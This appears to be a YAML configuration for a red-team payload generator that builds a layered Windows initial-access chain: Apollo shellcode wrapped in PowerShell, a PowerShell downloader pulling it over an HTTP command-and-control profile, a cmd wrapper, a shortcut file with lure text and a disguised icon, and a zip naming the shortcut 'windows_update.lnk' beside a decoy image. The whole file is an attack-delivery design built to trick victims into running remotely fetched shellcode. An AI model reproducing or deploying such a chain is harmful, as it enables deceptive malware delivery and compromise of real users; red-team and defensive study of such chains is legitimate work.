payloads:
  - name: scenario1_psh_shellcode.ps1 
    payload: psh_wraps_shellcode
    os: Windows
    wrapper: True
    wrapped_payload: apollo.shellcode 
    parameters: {} 

  - name: scenario1_psh_iex.ps1 
    payload: psh_remote_psh
    os: Windows
    downloader: True
    downloaded_payload: scenario1_psh_shellcode.ps1
    c2_profile: "http"
    profile_url: "/monster3.txt"
    url_parameter: "ps1_url"
    parameters: {}

  - name: scenario1_powershell.cmd 
    payload: cmd_wraps_powershell
    os: Windows
    wrapper: True
    wrapped_payload: scenario1_psh_iex.ps1
    parameters: 
      mode: inline

  - name: scenario1.lnk
    payload: lnk_wraps_cmd
    os: Windows
    wrapper: True
    wrapped_payload: scenario1_powershell.cmd
    parameters:
      description: "Click me plz"
      icon_file: "C:\\Windows\\System32\\WSReset.exe"
      window_mode: "Minimized"
      word_dir: "C:\\"

  - name: scenario1.zip
    payload: packmypayload
    os: Windows
    wrapper: True
    wrapped_payload: scenario1.lnk 
    parameters:
      archive_type: zip
      password: ""
      payload_name: windows_update.lnk
      file1: space.jpg
      file1_content: "file:image.jpg"  


